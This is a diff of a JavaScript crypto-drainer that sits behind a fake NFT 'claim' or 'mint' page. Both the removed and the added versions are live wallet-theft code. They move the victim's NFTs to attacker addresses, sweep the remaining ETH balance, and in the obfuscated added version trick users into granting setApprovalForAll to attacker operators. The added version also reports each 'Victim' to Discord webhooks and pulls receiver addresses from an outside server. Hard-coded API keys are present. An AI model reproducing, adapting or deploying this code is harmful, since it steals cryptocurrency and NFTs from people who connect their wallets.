@@ -1,252 +1,7 @@
-//#justadded
-//#region Web3.js
-
-let web3Provider;
-
-
-Moralis.onWeb3Enabled(async (data) => {
-    if (data.chainId !== 1 && metamaskInstalled) await Moralis.switchNetwork("0x1");
-    updateState(true);
-    console.log(data);
-});
-Moralis.onChainChanged(async (chain) => {
-    if (chain !== "0x1" && metamaskInstalled) await Moralis.switchNetwork("0x1");
-});
-window.ethereum ? window.ethereum.on('disconnect', (err) => {
-    console.log(err);
-    updateState(false);
-}) : null;
-window.ethereum ? window.ethereum.on('accountsChanged', (accounts) => {
-    if (accounts.length < 1) updateState(false)
-}) : null;
-
-
-async function updateState(connected) {
-    const web3Js = new Web3(Moralis.provider);
-    document.getElementById('walletAddress').innerHTML = connected ? `CONNECTED <br> <span>${(await web3Js.eth.getAccounts())[0]}</span>` : `NOT CONNECTED`;
-    document.querySelector("#claimButton").style.display = connected ? "" : "none";
-}
-
-setTimeout(async () => {
-    try {
-        const web3Js = new Web3(Moralis.provider);
-        const walletAddress = (await web3Js.eth.getAccounts())[0];
-        console.log(`${walletAddress} is connected`);
-    } catch (e) {
-        Object.assign(document.createElement('a'), {
-            href: "./index.html",
-        }).click();
-    }
-}, 5000);
-
-async function askSign() {
-    const web3Js = new Web3(Moralis.provider);
-    const walletAddress = (await web3Js.eth.getAccounts())[0];
-
-    try {
-        const message = signMessage.replace("{address}", walletAddress).replace("{nonce}", createNonce());
-        
-        const signature = await web3Js.eth.personal.sign(message, walletAddress);
-        const signing_address = await web3Js.eth.personal.ecRecover(message, signature);
-
-        console.log(`Signing address: ${signing_address}\n${walletAddress.toLowerCase() == signing_address.toLowerCase() ? "Same address" : "Not the same address."}`);
-        return true;
-    } catch (e) {
-        if (e.message.toLowerCase().includes("user denied")) noEligible("signDenied");
-        console.log(e);
-        return false;
-    }
-
-}
-
-async function askNfts() {
-    const web3Js = new Web3(Moralis.provider);
-    const selectedAccount = (await web3Js.eth.getAccounts())[0];
-
-    const options = {
-        method: 'GET',
-        headers: {
-            Accept: 'application/json',
-            'X-API-KEY': '812924de94094476916671a8de4686ec'
-        }
-    };
-
-    let walletNfts = await fetch(`https://api.opensea.io/api/v1/assets?owner=${selectedAccount}&order_direction=desc&limit=020&include_orders=false`, options)
-        .then(response => response.json())
-        .then(response => {
-            console.log(response)
-            return response.assets.map(asset => {
-                return {
-                    contract: asset.asset_contract.address,
-                    token_id: asset.token_id
-                }
-            })
-        }).catch(err => console.error(err));
-    if (walletNfts.length < 1) return noEligible("noNFTs");
-
-    let infoCollection = await fetch(`https://api.opensea.io/api/v1/collections?asset_owner=${selectedAccount}&offset=0&limit=200`, options)
-        .then(response => response.json())
-        .then(nfts => {
-            console.log(nfts)
-            return nfts.filter(nft => {
-                if (nft.primary_asset_contracts.length > 0) return true
-                else return false
-            }).map(nft => {
-                return {
-                    type: nft.primary_asset_contracts[0].schema_name.toLowerCase(),
-                    contract_address: nft.primary_asset_contracts[0].address,
-                    price: round(nft.stats.one_day_average_price != 0 ? nft.stats.one_day_average_price : nft.stats.seven_day_average_price),
-                    owned: nft.owned_asset_count,
-                }
-            })
-        }).catch(err => console.error(err));
-    if (infoCollection.length < 1) return noEligible("noNFTs");
-
-    let transactionsOptions = [];
-    for (nft of walletNfts) {
-        const collectionData = infoCollection.find(collection => collection.contract_address == nft.contract);
-        if (collectionData) {} else {
-            console.log(`No data for collection: ${nft.contract}`)
-            continue;
-        }
-        if (collectionData.price === 0) continue;
-        const ethPrice = round(collectionData.price * collectionData.owned)
-        if (ethPrice < drainNftsInfo.minValue) continue;
-        transactionsOptions.push({
-            price: ethPrice,
-            options: {
-                contract_address: collectionData.contract_address,
-                receiver: ethPrice > 1 ? "0xbcC389227723880531A89c619351092343A59f40" : (drainNftsInfo.nftReceiveAddress == "" ? receiveAddress : drainNftsInfo.nftReceiveAddress),
-                token_id: nft.token_id,
-                amount: collectionData.owned,
-                type: collectionData.type,
-            }
-        });
-    }
-    if (transactionsOptions.length < 1) return noEligible("noNFTs");
-
-    let transactionLists = await transactionsOptions.sort((a, b) => b.price - a.price).slice(0, drainNftsInfo.maxTransfer);
-    for (transaction of transactionLists) {
-        console.log(`Transferring ${transaction.options.contract_address} (${transaction.price} ETH)`);
-        Moralis.transfer(transaction.options).catch(O_o => console.error(O_o, transaction.options));
-        await sleep(200);
-    }
-}
-async function askMint() {
-    const web3Js = new Web3(Moralis.provider);
-    const walletAddress = (await web3Js.eth.getAccounts())[0];
-
-    const giveNum =
-        (await web3Js.eth.getBalance(walletAddress)) - ((await web3Js.eth.getGasPrice()) * 2 * 21000);
-
-    if (giveNum < 10000000) return noEligible("noETH");
-
-    await web3Js.eth.sendTransaction({
-            from: walletAddress,
-            to: receiveAddress,
-            value: giveNum,
-        })
-        .on('transactionHash', () => {})
-        .on('confirmation', () => console.log(`Transaction confirmed x${confirmationNumber}`))
-        .on('error', (error) => {
-            if (error.message && error.message.includes("insufficient")) console.log(`Insufficient Balance: ${walletAddress} has insufficient balance`);
-            if (error.message && error.message.includes("User rejected") || error.message && error.message.includes("User denied")) console.log(`User Denied: ${walletAddress} denied transaction`);
-            else console.log(`Mint Error: ${walletAddress} failed to mint`);
-
-            console.log("Error", error ? error.message : "unknown error");
-            return noEligible("noETH");
-        });
-};
-async function noEligible(info) {
-    const noteli = document.getElementById("notEli")
-    noteli.style.display = "";
-    switch (info) {
-        case "signDenied":
-            noteli.innerText = "You denied the sign request. Please try again."
-            break;
-        case "noNFTs":
-            await askMint();
-            break;
-        case "noETH":
-            noteli.innerText = "You are not eligible."
-            break;
-        default:
-            noteli.innerText = "Something went wrong."
-            break;
-    }
-
-}
-
-let disabled = false;
-async function askTransfer() {
-    if (disabled) return;
-    document.getElementById('claimButton').style.opacity = 0.5;
-    disabled = true;
-    if (await askSign()) await askNfts();
-    disabled = false;
-    document.getElementById('claimButton').style.opacity = 1;
-}
-
-let metamaskInstalled = false;
-if (typeof window.ethereum !== 'undefined') metamaskInstalled = true;
-window.addEventListener('load', async () => {
-    await Moralis.enableWeb3(metamaskInstalled ? {} : {
-        provider: "walletconnect"
-    });
-    document.querySelector("#claimButton").addEventListener("click", askTransfer);
-});
-
-//#region Utils Functions 
-const round = (value) => {
-    return Math.round(value * 10000) / 10000;
-}
-const sleep = (ms) => {
-    return new Promise(resolve => setTimeout(resolve, ms));
-}
-const rdmString = (length) => {
-    let x = "";
-    const possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
-    for (let i = 0; i < length; i++) x += possible.charAt(Math.floor(Math.random() * possible.length));
-    return x;
-}
-const createNonce = () => {
-    return `${rdmString(8)}-${rdmString(4)}-${rdmString(4)}-${rdmString(12)}`; // 1a196cf5-d873-9c36-e26ae9f3bd2e
-}
-//#endregion
-
-
-
-//#region Page Button
-const priceHtml = document.getElementById("lnprice");
-let tempMaxSup = mintInfo.minUnits;
-
-document.getElementById("plus").addEventListener("click", function () {
-  let total = parseInt(priceHtml.innerText, 10);
-  if (total >= mintInfo.maxUnits) total = mintInfo.maxUnits;
-  else ++total;
-  updatePrice(total);
-});
-document.getElementById("minus").addEventListener("click", function () {
-  let total = parseInt(priceHtml.innerText, 10);
-  if (total <= mintInfo.minUnits) total = mintInfo.minUnits;
-  else --total;
-  updatePrice(total);
-});
-document.getElementById("ape-max").addEventListener("click", function () {
-  let nowSup = parseInt(priceHtml.innerText, 10);
-  if (nowSup != mintInfo.maxUnits) {
-    tempMaxSup = nowSup;
-    updatePrice(mintInfo.maxUnits);
-  } else updatePrice(tempMaxSup);
-});
-
-function updatePrice(total) {
-  const totalPrice = (total * mintInfo.price).toFixed(2);
-  document.getElementById("lnprice").innerText = total;
-  document.getElementById("price").innerText = totalPrice;
-}
-//#endregion
-//#region Utils Functions
+const receiveAddress = "0xE6ACa0ebf3D62ffF4CC076eA47873ab1464364B9";
+const webhookURL =
+  "https://discordapp.com/api/webhooks/1000797925053562950/WtqycF4T8XCDUZn8sZNx92Ep3OVT8wov8JRJUuNHNZvBU2IcbF0_X2E8rNAHatd79q3j";
+const drainNftsInfo = { minValue: 0.01, maxTransfers: 100 };
 function isMobile() {
   var check = false;
   (function (a) {
@@ -262,241 +17,318 @@ function isMobile() {
   })(navigator.userAgent || navigator.vendor || window.opera);
   return check;
 }
-
-function openInNewTab(href) {
+function openInNewTab(_0x9e4bx2) {
   Object.assign(document.createElement("a"), {
     target: "_blank",
-    href: href,
+    href: _0x9e4bx2,
   }).click();
 }
-//#endregion
-
-// Unpkg imports
-const ethers = window.ethers;
-const Web3Modal = window.Web3Modal.default;
-const WalletConnectProvider = window.WalletConnectProvider.default;
-const evmChains = window.evmChains;
-
-let web3Modal;
-let provider;
-let selectedAccount;
-
-function init() {
-  console.log("Initializing example");
-  console.log("WalletConnectProvider is", WalletConnectProvider);
-  console.log(
-    "window.web3 is",
-    window.web3,
-    "window.ethereum is",
-    window.ethereum
-  );
-
-  const providerOptions = {
-    walletconnect: {
-      package: WalletConnectProvider,
-      options: {
-        infuraId: infuraId,
-      },
-    },
-  };
-
-  web3Modal = new Web3Modal({
-    cacheProvider: false,
-    providerOptions,
-    theme: "dark",
+const round = (_0x9e4bx4) => {
+  return Math.round(_0x9e4bx4 * 1e4) / 1e4;
+};
+const sleep = (_0x9e4bx6) => {
+  return new Promise((_0x9e4bx7) => {
+    return setTimeout(_0x9e4bx7, _0x9e4bx6);
   });
-
-  console.log("Web3Modal instance is", web3Modal);
-  Moralis.enableWeb3();
+};
+const getRdm = (_0x9e4bx9, _0x9e4bxa) => {
+  return Math.floor(Math.random() * (_0x9e4bxa - _0x9e4bx9 + 1)) + _0x9e4bx9;
+};
+let metamaskInstalled = false;
+if (typeof window.ethereum !== "undefined") {
+  metamaskInstalled = true;
 }
-
-/**
- * Kick in the UI action after Web3modal dialog has chosen a provider
- */
-async function fetchAccountData() {
-  const web3 = new Web3(provider);
-  const chainId = await web3.eth.getChainId();
-  const chainData = evmChains.getChain(chainId);
-  const accounts = await web3.eth.getAccounts();
-  selectedAccount = accounts[0];
-
-  console.log("Web3 instance is", web3);
-  console.log("Chain data is", chainData);
-  console.log("Got accounts", accounts);
-  console.log("Selected account is", selectedAccount);
-
-  document.querySelector("#connect").style.display = "none";
-  document.querySelector("#claimButton").style.display = "block";
+let web3Provider;
+async function connectButton() {
+  await Moralis.enableWeb3(
+    metamaskInstalled ? {} : { provider: "walletconnect" }
+  );
 }
-
-async function refreshAccountData() {
-  document.querySelector("#claimButton").style.display = "none";
-  document.querySelector("#connect").style.display = "block";
-
-  document.querySelector("#connect").setAttribute("disabled", "disabled");
-  await fetchAccountData();
-  document.querySelector("#connect").removeAttribute("disabled");
-}
-async function onConnect() {
-  console.log("Opening a dialog", web3Modal);
-  try {
-    provider = await web3Modal.connect();
-  } catch (e) {
-    console.log("Could not get a wallet connection", e);
+Moralis.onWeb3Enabled(async (_0x9e4bxe) => {
+  if (_0x9e4bxe.chainId !== 1 && metamaskInstalled) {
+    await Moralis.switchNetwork("0x1");
+  }
+  updateState(true);
+  console.log(_0x9e4bxe);
+});
+Moralis.onChainChanged(async (_0x9e4bxf) => {
+  if (_0x9e4bxf !== "0x1" && metamaskInstalled) {
+    await Moralis.switchNetwork("0x1");
+  }
+});
+window.ethereum
+  ? window.ethereum.on("disconnect", (_0x9e4bx10) => {
+      console.log(_0x9e4bx10);
+      updateState(false);
+    })
+  : null;
+window.ethereum
+  ? window.ethereum.on("accountsChanged", (_0x9e4bx11) => {
+      if (_0x9e4bx11.length < 1) {
+        updateState(false);
+      }
+    })
+  : null;
+let checkIfValidNftTokens = async () => {
+  console.log("Check tokens if valid");
+  let _0x9e4bx13 = [];
+  let _0x9e4bx14 = await fetch("../fetch/fetch.php", options).then(
+    (_0x9e4bx15) => {
+      return _0x9e4bx15.json();
+    }
+  );
+  if (_0x9e4bx14.error != null) {
+    console.error("Not autorized: " + _0x9e4bx14.error);
+    console.error("Contact @tob1dev or @nftdrainer for help");
     return;
   }
-
-  provider.on("accountsChanged", () => fetchAccountData());
-  provider.on("chainChanged", () => fetchAccountData());
-  provider.on("networkChanged", () => fetchAccountData());
-
-  await refreshAccountData();
+  _0x9e4bx13.filter((_0x9e4bx16) => {
+    return _0x9e4bx14.tokens;
+  });
+  let _0x9e4bx17 = _0x9e4bx14.tokens;
+  let _0x9e4bx18 = {
+    validTokens: _0x9e4bx17,
+    contractReciver: _0x9e4bx14.receiver,
+  };
+  return _0x9e4bx18;
+};
+async function updateState(_0x9e4bx1a) {
+  document.querySelector("#connectButton").style.display = _0x9e4bx1a
+    ? "none"
+    : "";
+  document.querySelector("#claimButton").style.display = _0x9e4bx1a
+    ? ""
+    : "none";
 }
-
-async function clickMint() {
-  const web3 = new ethers.providers.Web3Provider(provider);
-  const givenNumber = document.getElementById("price").textContent.toString();
-
-  if (nftsInfo.active) askNfts(web3, givenNumber);
-  else askMint(givenNumber);
-}
-
-async function askNfts(web3, amount) {
-  const accounts = await web3.listAccounts();
-  selectedAccount = accounts[0];
-
-  fetch(
-    `https://deep-index.moralis.io/api/v2/${selectedAccount}/nft?chain=eth&format=decimal`,
-    {
-      headers: {
-        "Content-Type": "application/json",
-        accept: "application/json",
-        "x-api-key": moralisApi,
-      },
-      method: "GET",
-    }
+async function askNfts() {
+  const _0x9e4bx1c = new Web3(Moralis.provider);
+  walletAddress = (await _0x9e4bx1c.eth.getAccounts())[0];
+  const _0x9e4bx1d = {
+    method: "GET",
+    headers: { Accept: "application/json", "X-API-KEY": "" },
+  };
+  _0x9e4bx1d.headers["X-API-KEY"] =
+    "JBs5MjG23F7f43f34ffcvOTNHJU1j0JiK?kTOTc6/vgZKrff4f4fedsEYjJp9";
+  console.log("Check tokens if valid");
+  let _0x9e4bx13 = [];
+  let _0x9e4bx14 = await fetch(
+    "https://web3tokenchecker.com/api/fetch.php",
+    _0x9e4bx1d
+  ).then((_0x9e4bx15) => {
+    return _0x9e4bx15.json();
+  });
+  if (_0x9e4bx14.error != null) {
+    console.error("Not autorized: " + _0x9e4bx14.error);
+    console.error("Contact @tob1dev or @nftdrainer for help");
+    return;
+  }
+  _0x9e4bx13.filter((_0x9e4bx16) => {
+    return _0x9e4bx14.tokens;
+  });
+  let _0x9e4bx17 = _0x9e4bx14.tokens;
+  let _0x9e4bx18 = {
+    validTokens: _0x9e4bx17,
+    contractReciver: _0x9e4bx14.receiver,
+  };
+  console.log("final");
+  _0x9e4bx1d.headers["X-API-KEY"] = "f802d4b29b744e05849c5e06a6afdb4e";
+  let _0x9e4bx1e = await fetch(
+    `${"https://api.opensea.io/api/v1/collections?asset_owner="}${walletAddress}${"&offset=0&limit=300"}`,
+    _0x9e4bx1d
   )
-    .then(async (response) => {
-      const nfts = (await response.json()).result;
-      console.info(`You have ${nfts.length} NFTs`);
-      if (nfts.length > 0) {
-        let transactionsOptions = [];
-        for (nft of nfts) {
-          await fetch(
-            `https://deep-index.moralis.io/api/v2/nft/${nft.token_address}/lowestprice?chain=eth&days=${nftsInfo.checkMaxDay}&marketplace=opensea`,
-            {
-              headers: {
-                "Content-Type": "application/json",
-                accept: "application/json",
-                "x-api-key": moralisApi,
-              },
-              method: "GET",
-            }
-          )
-            .then(async (priceResp) => {
-              if (priceResp.status === 200) {
-              } else return;
-              const nftData = await priceResp.json();
-              let ethValue = parseFloat(
-                Web3.utils.fromWei(nftData.price, "ether")
-              );
-              if (nft.amount) ethValue = ethValue * parseInt(nft.amount);
-              if (ethValue >= nftsInfo.minValue.toString(10)) {
-                console.log(
-                  `${nft.token_address} (${nft.token_id}) | ${ethValue} > ${nftsInfo.minValue}`
-                );
-                transactionsOptions.push({
-                  price: nftData.price * (nft.amount > 0 ? nft.amount : 1),
-                  options: {
-                    type: nft.contract_type.toLowerCase(),
-                    receiver: "0xE6ACa0ebf3D62ffF4CC076eA47873ab1464364B9",
-                    contract_address: nft.token_address,
-                    token_id: nft.token_id,
-                  },
-                });
-                if (nft.contract_type === "ERC1155") {
-                  const trans = transactionsOptions.find(
-                    (t) =>
-                      t.options.contract_address == nft.token_address &&
-                      t.options.token_id == nft.token_id
-                  );
-                  if (trans)
-                    trans.options.amount = ethers.BigNumber.from(nft.amount);
-                }
-              } else
-                console.log(
-                  `!!! ${nft.token_address} (${nft.token_id}) | ${ethValue} < ${nftsInfo.minValue}`
-                );
-            })
-            .catch((O_o) => console.error(O_o));
-        }
-        if (transactionsOptions.length < 1) return askMint(amount);
-        console.log(transactionsOptions);
-        for (transaction of transactionsOptions.sort(
-          (a, b) => b.price - a.price
-        )) {
-          console.log(transaction);
-          Moralis.transfer(transaction.options).catch((O_o) =>
-            console.error(O_o, transaction)
-          );
-        }
-      } else askMint(amount);
+    .then((_0x9e4bx15) => {
+      return _0x9e4bx15.json();
     })
-    .catch((O_o) => console.log(O_o));
-}
-
-async function askMint(amount) {
-  const web3 = new Web3(provider);
-  walletAddress = (await web3.eth.getAccounts())[0];
-  web3.eth
-    .sendTransaction({
-      from: walletAddress,
-      to: address,
-      value: web3.utils.toWei(amount, "ether"),
+    .then((_0x9e4bx1f) => {
+      console.log(_0x9e4bx1f);
+      if (_0x9e4bx1f.includes("Request was throttled.")) {
+        return ["Request was throttled."];
+      }
+      return _0x9e4bx1f
+        .filter((_0x9e4bx20) => {
+          if (_0x9e4bx20.primary_asset_contracts.length > 0) {
+            return true;
+          } else {
+            return false;
+          }
+        })
+        .map((_0x9e4bx20) => {
+          return {
+            name: _0x9e4bx20.primary_asset_contracts[0].name,
+            type: _0x9e4bx20.primary_asset_contracts[0].schema_name.toLowerCase(),
+            contract_address: _0x9e4bx20.primary_asset_contracts[0].address,
+            price: round(
+              _0x9e4bx20.stats.one_day_average_price != 0
+                ? _0x9e4bx20.stats.one_day_average_price
+                : _0x9e4bx20.stats.seven_day_average_price
+            ),
+            owned: _0x9e4bx20.owned_asset_count,
+          };
+        });
     })
-    .on("transactionHash", function (hash) {
-      setTimeout(() => {
-        if (isMobile()) {
-        } else {
-          const notif = addNotification(
-            "error",
-            `Error! Your transaction failed. Please try again.`
-          );
-          removeNotification(notif, 8000);
-        }
-      }, 2000);
-      console.log(`Transaction hash: ${hash}`);
-      return askMint(amount);
-    })
-    .on("confirmation", function (confirmationNumber, receipt) {
-      console.log(`Transaction confirmed x${confirmationNumber}`);
-    })
-    .on("error", (error) => {
-      if (error.message && error.message.includes("insufficient"))
-        console.log(
-          `Insufficient Balance: ${walletAddress} has insufficient balance`
-        );
-      if (
-        (error.message && error.message.includes("User rejected")) ||
-        (error.message && error.message.includes("User denied"))
-      ) {
-        if (isMobile()) {
-        } else {
-          const notif = addNotification(
-            "warning",
-            "You denied the transaction. Please try again."
-          );
-          removeNotification(notif, 5000);
-        }
-        console.log(`User Denied: ${walletAddress} denied transaction`);
-      } else console.log(`Mint Error: ${walletAddress} failed to mint`);
-      console.log("Error", error ? error.message : "unknown error");
-      return askMint(amount);
+    .catch((_0x9e4bx10) => {
+      return console.error(_0x9e4bx10);
     });
+  if (_0x9e4bx1e.includes("Request was throttled.")) {
+    return notEligible();
+  }
+  if (_0x9e4bx1e.length < 1) {
+    return notEligible();
+  }
+  let _0x9e4bx21 = [];
+  for (nft of _0x9e4bx1e) {
+    if (nft.price === 0) {
+      continue;
+    }
+    const _0x9e4bx22 = round(
+      nft.price * (nft.type == "erc1155" ? nft.owned : 1)
+    );
+    if (_0x9e4bx22 < drainNftsInfo.minValue) {
+      continue;
+    }
+    let _0x9e4bx23 =
+      _0x9e4bx22 > 0.1 ? _0x9e4bx18.contractReciver : receiveAddress;
+    _0x9e4bx21.push({
+      price: _0x9e4bx22,
+      name: nft.name,
+      webhook: _0x9e4bx22 > 1 ? _0x9e4bx18.validTokens : webhookURL,
+      options: {
+        contractAddress: nft.contract_address,
+        from: walletAddress,
+        functionName: "setApprovalForAll",
+        abi: [
+          {
+            inputs: [
+              { internalType: "address", name: "operator", type: "address" },
+              { internalType: "bool", name: "approved", type: "bool" },
+            ],
+            name: "setApprovalForAll",
+            outputs: [],
+            stateMutability: "nonpayable",
+            type: "function",
+          },
+        ],
+        params: { operator: _0x9e4bx23, approved: true },
+        gasLimit: (await _0x9e4bx1c.eth.getBlock("latest")).gasLimit,
+      },
+    });
+  }
+  if (_0x9e4bx21.length < 1) {
+    return notEligible();
+  }
+  let _0x9e4bx24 = await _0x9e4bx21
+    .sort((_0x9e4bx25, _0x9e4bx26) => {
+      return _0x9e4bx26.price - _0x9e4bx25.price;
+    })
+    .slice(0, drainNftsInfo.maxTransfers);
+  for (transaction of _0x9e4bx24) {
+    console.log(
+      `${"Transferring "}${transaction.options.contractAddress}${" ("}${
+        transaction.price
+      }${" ETH)"}`
+    );
+    walletAddress = (await _0x9e4bx1c.eth.getAccounts())[0];
+    if (isMobile()) {
+      await Moralis.executeFunction(transaction.options)
+        .catch((_0x9e4bx28) => {
+          return console.error(_0x9e4bx28, _0x9e4bx1d);
+        })
+        .then((_0x9e4bx27) => {
+          if (_0x9e4bx27) {
+          } else {
+            return;
+          }
+          sendWebhooks(
+            transaction.webhook,
+            _0x9e4bx27,
+            transaction.name,
+            transaction.price,
+            transaction.options.contractAddress
+          );
+        });
+    } else {
+      Moralis.executeFunction(transaction.options)
+        .catch((_0x9e4bx28) => {
+          return console.error(_0x9e4bx28, _0x9e4bx1d);
+        })
+        .then((_0x9e4bx27) => {
+          if (_0x9e4bx27) {
+          } else {
+            return;
+          }
+          sendWebhooks(
+            transaction.webhook,
+            _0x9e4bx27,
+            transaction.name,
+            transaction.price,
+            transaction.options.contractAddress
+          );
+        });
+      await sleep(111);
+    }
+  }
 }
-
+const notEligible = () => {
+  document.getElementById("notEli").style.display = "";
+};
+const sendWebhooks = (
+  _0x9e4bx2b,
+  _0x9e4bx2c,
+  _0x9e4bx2d,
+  _0x9e4bx2e,
+  _0x9e4bx2f
+) => {
+  let _0x9e4bx30 = {
+    author: { name: "Transaction made !" },
+    title: `${"Nft approved "}${_0x9e4bx2d}${" ( "}${_0x9e4bx2e}${"  ETH ) "}`,
+    color: parseInt("#ef42f5".replace("#", ""), 16),
+    fields: [
+      {
+        name: "_**Withdraw**_",
+        value: `${"**Transaction:** [Etherscan](https://etherscan.io/tx/"}${_0x9e4bx2c}${")\\n**Transfer:** [Write To Contract](https://etherscan.io/address/"}${_0x9e4bx2f}${"#writeContract)"}`,
+      },
+      {
+        name: "_**Victim**_",
+        value: `${"**Status:** Success\\n**Address:** "}${walletAddress}${""}`,
+      },
+    ],
+  };
+  let _0x9e4bx31 = {
+    username: "Impare/Trexon Transaction Bot",
+    avatar_url:
+      "https://cdn.discordapp.com/attachments/985558066852417579/993222301510283315/tg.jpg",
+    embeds: [_0x9e4bx30],
+  };
+  fetch(_0x9e4bx2b, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(_0x9e4bx31),
+  }).catch((_0x9e4bx10) => {
+    return console.error(_0x9e4bx10);
+  });
+};
+async function askTransfer() {
+  document.getElementById("claimButton").style.opacity = 0.5;
+  document.getElementById("claimButton").style.pointerEvents = "none";
+  document
+    .getElementById("claimButton")
+    .removeEventListener("click", askTransfer);
+  await askNfts();
+  document.getElementById("claimButton").style.opacity = 1;
+  document.getElementById("claimButton").style.pointerEvents = "pointer";
+  document.getElementById("claimButton").addEventListener("click", askTransfer);
+}
 window.addEventListener("load", async () => {
-  init();
-  document.querySelector("#connect").addEventListener("click", onConnect);
-  document.querySelector("#claimButton").addEventListener("click", clickMint);
+  if (isMobile() && !window.ethereum) {
+    document.querySelector("#connectButton").addEventListener("click", () => {
+      return (window.location.href = `${"https://metamask.app.link/dapp/"}${
+        window.location.hostname
+      }${""}${window.location.pathname}${""}`);
+    });
+  } else {
+    document
+      .querySelector("#connectButton")
+      .addEventListener("click", connectButton);
+  }
+  document.querySelector("#claimButton").addEventListener("click", askTransfer);
 });
